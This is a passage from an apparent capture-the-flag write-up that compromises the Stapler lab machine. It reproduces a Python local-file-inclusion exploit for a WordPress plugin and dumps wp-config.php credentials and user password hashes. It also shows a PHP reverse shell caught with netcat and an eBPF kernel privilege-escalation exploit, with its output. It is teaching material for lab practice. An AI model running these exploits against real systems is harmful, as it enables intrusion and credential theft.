<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="hello.php">hello.php</a></td><td align="right">2016-06-03 23:40  </td><td align="right">2.2K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="shortcode-ui/">shortcode-ui/</a></td><td align="right">2015-11-12 17:07  </td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="two-factor/">two-factor/</a></td><td align="right">2016-04-12 22:56  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.0.2.7 Port 12380</address>
</body></html>
{% endhighlight %}

Sure is!  Hmm and there are a couple plugins that were not discovered by wpscan, and a hello.php.  Running hello.php produces no output.  Suspicious.

A little searching on exploit-db using searchsploit for wordpress video plugins results in the following:

{% highlight bash %}
root@kali:~/evidence/stapler# searchsploit wordpress advanced video
---------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/platforms)
---------------------------------------------------------------------------------- ----------------------------------
Wordpress Advanced Video Plugin 1.0 - Local File Inclusion                        | ./php/webapps/39646.py
---------------------------------------------------------------------------------- ----------------------------------
root@kali:~/evidence/stapler# -
{% endhighlight %}

The exploit contains PoC code written in python for a Local File Inclusion vulnerability.  I like those.

{% highlight python %}
#!/usr/bin/env python

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
# Version: 1.0
# Tested on: Linux Apache / Wordpress 4.2.2

#	Timeline
#	03/24/2016 - Bug discovered
#	03/24/2016 - Initial notification of vendor
#	04/01/2016 - No answer from vendor, public release of bug


# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:

#  function ave_publishPost(){
#    $title = $_REQUEST['title'];
#    $term = $_REQUEST['term'];
#    $thumb = $_REQUEST['thumb'];
# <snip>
# Line 78:
#    $image_data = file_get_contents($thumb);


# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)

import random
import urllib2
import re

url = "http://127.0.0.1/wordpress" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content =  objHtml.readlines()
for line in content:
	numbers = re.findall(r'\d+',line)
	id = numbers[-1]
	id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
		urls=re.findall('"(https?://.*?)"', line)
		print urllib2.urlopen(urls[0]).read()
{% endhighlight %}

I make a duplicate of the script and modify the target URL to `https://10.0.2.7:12380/blogblog/`, but it complains about HTTPs.  Inspection of the code makes me think the following URL would work: `https://10.0.2.7:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=1234567890&short=rnd&term=rnd&thumb=../wp-config.php`.

The URL loads without error and reports `https://10.0.2.7:12380/blogblog/?p=21` along with a 0 that doesn't belong as it was a return code.  Now to check if the `wp-content/uploads` directory contains our malicious code.

![wp-content-uploads](/img/stapler/wp-content-uploads.png)

{% highlight html %}
root@kali:~/evidence/stapler# cat 809604653.jpeg
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
root@kali:~/evidence/stapler#
{% endhighlight %}

Excellent the exploit worked and we have the wordpress configuration file.  Of particular interest are the `DB_USER` which is `root` and `DB_PASSWORD` which is `plbkac`.  We should now be able to access the mysql database through phpMyAdmin at `https://10.0.2.7:12380/phpmyadmin/`.

## phpMyAdmin

Utilizing the credentials we obtained from the wordpress configuratrion we login to phpmyadmin and attempt to steal the user's passwords.  Browse to wordpress->users and export to csv.

{% highlight csv %}
root@kali:~/evidence/stapler# cat wp_users.csv
"1","John","$P$B7889EMq/erHIuZapMB8GEizebcIy9.","john","john@red.localhost","http://localhost","2016-06-03 23:18:47",,"0","John Smith"
"2","Elly","$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0","elly","Elly@red.localhost",,"2016-06-05 16:11:33",,"0","Elly Jones"
"3","Peter","$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0","peter","peter@red.localhost",,"2016-06-05 16:13:16",,"0","Peter Parker"
"4","barry","$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0","barry","barry@red.localhost",,"2016-06-05 16:14:26",,"0","Barry Atkins"
"5","heather","$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10","heather","heather@red.localhost",,"2016-06-05 16:18:04",,"0","Heather Neville"
"6","garry","$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1","garry","garry@red.localhost",,"2016-06-05 16:18:23",,"0","garry"
"7","harry","$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0","harry","harry@red.localhost",,"2016-06-05 16:18:41",,"0","harry"
"8","scott","$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1","scott","scott@red.localhost",,"2016-06-05 16:18:59",,"0","scott"
"9","kathy","$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0","kathy","kathy@red.localhost",,"2016-06-05 16:19:14",,"0","kathy"
"10","tim","$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0","tim","tim@red.localhost",,"2016-06-05 16:19:29",,"0","tim"
"11","ZOE","$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1","zoe","zoe@red.localhost",,"2016-06-05 16:19:50",,"0","ZOE"
"12","Dave","$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.","dave","dave@red.localhost",,"2016-06-05 16:20:09",,"0","Dave"
"13","Simon","$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0","simon","simon@red.localhost",,"2016-06-05 16:20:35",,"0","Simon"
"14","Abby","$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.","abby","abby@red.localhost",,"2016-06-05 16:20:53",,"0","Abby"
"15","Vicki","$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131","vicki","vicki@red.localhost",,"2016-06-05 16:21:14",,"0","Vicki"
"16","Pam","$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0","pam","pam@red.localhost",,"2016-06-05 16:42:23",,"0","Pam"
root@kali:~/evidence/stapler#
{% endhighlight %}

On to the cracking.  Generallly the 1st user is always an administrator so we will target that hash with hashcat.

{% highlight bash %}
{% endhighlight %}

Excellent, `john`'s password is `incorrect`.  Heh that's amusing.

![Wordpress Admin](/img/stapler/wp-admin-login.png)

After a bit of poking around, it seems we can upload plugins.  via the `Add Plugins` interface.

![Wordpress Admin Plugins](/img/stapler/wp-admin-plugins.png)

I modify my `php-reverse-shell.php` exploit with the proper LHOST and LPORT and upload it via the interface.  At the same time starting a local netcat listener with `nc -lvp 2222`.  Uploaded items go into `/blogblog/wp-content/uploads`.

![Wordpress Backdoor Plugins](/img/stapler/wp-backdoor.png)

At this point execution is simply clicking and going to the netcat listener to get shell.

{% highlight bash %}
root@kali:~/evidence/stapler# nc -lvp 2222
listening on [any] 2222 ...
10.0.2.7: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.7] 53406
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 13:57:29 up 13:37,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/
$ -
{% endhighlight %}

At this point I go ahead and try LinEnum.sh and linuxprivchecker.py to find ways to become root.  Nothing apparent comes up, however checking the kernel is a different story.

{% highlight bash %}
$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
$ -
{% endhighlight %}

{% highlight bash%}
root@kali:~# searchsploit 4.4.0
---------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/platforms)
---------------------------------------------------------------------------------- ----------------------------------
PHP 4.4.0 - (mysql_connect function) Local Buffer Overflow                        | ./windows/local/1406.php
Helpdesk Pilot Knowledge Base 4.4.0 - SQL Injection                               | ./php/webapps/10788.txt
Foxit MobilePDF 4.4.0 iOS - Multiple Vulnerabilities                              | ./ios/webapps/35775.txt
Comodo Backup 4.4.0.0 - NULL Pointer Dereference EOP                              | ./windows/local/35905.c
eTouch SamePage 4.4.0.0.239 - Multiple Vulnerabilities                            | ./php/webapps/36089.txt
Photo Manager Pro 4.4.0 iOS - File Include                                        | ./ios/webapps/36796.txt
Photo Manager Pro 4.4.0 iOS - Code Execution                                      | ./ios/webapps/36798.txt
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - netfilter target_offset OOB Privilege  | ./linux/local/40049.c
---------------------------------------------------------------------------------- ----------------------------------
root@kali:~# searchsploit 16.04
---------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/platforms)
---------------------------------------------------------------------------------- ----------------------------------
censura 1.16.04 - (Blind SQL Injection / Cross-Site Scripting) Multiple Vulnerabi | ./php/webapps/9129.txt
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Privil | ./linux/local/39772.txt
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps             | ./linux/dos/39773.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                     | ./linux/local/40054.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - netfilter target_offset OOB Privilege  | ./linux/local/40049.c
---------------------------------------------------------------------------------- ----------------------------------
root@kali:~# -
{% endhighlight %}

A couple possibilities there!  Looks like `40049.c`, `39772.txt` are both good choices.  Lets try 40049.c first.  If memory serves this one is actually two different pieces of code.  So we split it out into pwn.c and

{% highlight bash %}
root@kali:~/tools/LinEnum-master# head pwn.c
/**
 * Run ./decr first!
 *
 * 23/04/2016
 * - vnik
 */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
root@kali:~/tools/LinEnum-master# head -n 7 pwn.c
/**
 * Run ./decr first!
 *
 * 23/04/2016
 * - vnik
 */
#include <stdio.h>
root@kali:~/tools/LinEnum-master# head -n 6 pwn.c
/**
 * Run ./decr first!
 *
 * 23/04/2016
 * - vnik
 */
root@kali:~/tools/LinEnum-master# head -n 23 decr.c
/**
 * Ubuntu 16.04 local root exploit - netfilter target_offset OOB
 * check_compat_entry_size_and_hooks/check_entry
 *
 * Tested on 4.4.0-21-generic. SMEP/SMAP bypass available in descr_v2.c
 *
 * Vitaly Nikolenko
 * vnik@cyseclabs.com
 * 23/04/2016
 *
 *
 * ip_tables.ko needs to be loaded (e.g., iptables -L as root triggers
 * automatic loading).
 *
 * vnik@ubuntu:~$ uname -a
 * Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 * vnik@ubuntu:~$ gcc decr.c -m32 -O2 -o decr
 * vnik@ubuntu:~$ gcc pwn.c -O2 -o pwn
 * vnik@ubuntu:~$ ./decr
 * netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
 * [!] Decrementing the refcount. This may take a while...
 * [!] Wait for the "Done" message (even if you'll get the prompt back).
 * vnik@ubuntu:~$ [+] Done! Now run ./pwn
root@kali:~/tools/LinEnum-master#
{% endhighlight %}

But... it fails to run.  Ok lets look at the other exploit.

{% highlight bash %}
root@kali:~# cat /usr/share/exploitdb/platforms/linux/local/39772.txt
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808

In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
These conditions are fulfilled in Ubuntu 16.04.

When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
function that touches the supplied eBPF instructions is
replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
map file descriptors and looks up pointers for the corresponding map files.
This is done as follows:

	/* look for pseudo eBPF instructions that access map FDs and
	 * replace them with actual map pointers
	 */
	static int replace_map_fd_with_map_ptr(struct verifier_env *env)
	{
		struct bpf_insn *insn = env->prog->insnsi;
		int insn_cnt = env->prog->len;
		int i, j;

		for (i = 0; i < insn_cnt; i++, insn++) {
			[checks for bad instructions]

			if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
				struct bpf_map *map;
				struct fd f;

				[checks for bad instructions]

				f = fdget(insn->imm);
				map = __bpf_map_get(f);
				if (IS_ERR(map)) {
					verbose("fd %d is not pointing to valid bpf_map\n",
						insn->imm);
					fdput(f);
					return PTR_ERR(map);
				}

				[...]
			}
		}
		[...]
	}


__bpf_map_get contains the following code:

/* if error is returned, fd is released.
 * On success caller should complete fd access with matching fdput()
 */
struct bpf_map *__bpf_map_get(struct fd f)
{
	if (!f.file)
		return ERR_PTR(-EBADF);
	if (f.file->f_op != &bpf_map_fops) {
		fdput(f);
		return ERR_PTR(-EINVAL);
	}

	return f.file->private_data;
}

The problem is that when the caller supplies a file descriptor number referring
to a struct file that is not an eBPF map, both __bpf_map_get() and
replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
__fget_light() detected that the file descriptor table is shared with another
task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
the reference count of the struct file to be over-decremented, allowing an
attacker to create a use-after-free situation where a struct file is freed
although there are still references to it.

A simple proof of concept that causes oopses/crashes on a kernel compiled with
memory debugging options is attached as crasher.tar.


One way to exploit this issue is to create a writable file descriptor, start a
write operation on it, wait for the kernel to verify the file's writability,
then free the writable file and open a readonly file that is allocated in the
same place before the kernel writes into the freed file, allowing an attacker
to write data to a readonly file. By e.g. writing to /etc/crontab, root
privileges can then be obtained.

There are two problems with this approach:

The attacker should ideally be able to determine whether a newly allocated
struct file is located at the same address as the previously freed one. Linux
provides a syscall that performs exactly this comparison for the caller:
kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).

In order to make exploitation more reliable, the attacker should be able to
pause code execution in the kernel between the writability check of the target
file and the actual write operation. This can be done by abusing the writev()
syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
read accesses, then mmap()s a file containing a struct iovec from that FUSE
filesystem and passes the result of mmap() to writev(). (Another way to do this
would be to use the userfaultfd() syscall.)

writev() calls do_writev(), which looks up the struct file * corresponding to
the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
that the target file is writable, then calls do_readv_writev(), which first
copies the struct iovec from userspace using import_iovec(), then performs the
rest of the write operation. Because import_iovec() performs a userspace memory
access, it may have to wait for pages to be faulted in - and in this case, it
has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
allowing the attacker to suspend code execution in the kernel at that point
arbitrarily.

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7


Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
E-DB Mirror: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip

root@kali:~#
{% endhighlight %}

After reading a bit we need to go to https://bugs.chromium.org/p/project-zero/issues/detail?id=808 to download the actual PoC.

![double-fdput](/img/stapler/double-fdput.png)

{% highlight bash %}
$ tar -xvf exploit.tar
tar: exploit.tar: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
$ mv exploit.zip exploit.tar
$ tar -xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
$ cd ebpf_mapfd_doubleput_exploit/
$ ./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cd /root
ls
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
{% endhighlight %}

## Final Thoughts

Great overall challenge, really enjoyed the Web App attacks.  I know the description states there are two ways to do the attack, so I will have to give this one another go later on to find that second route.
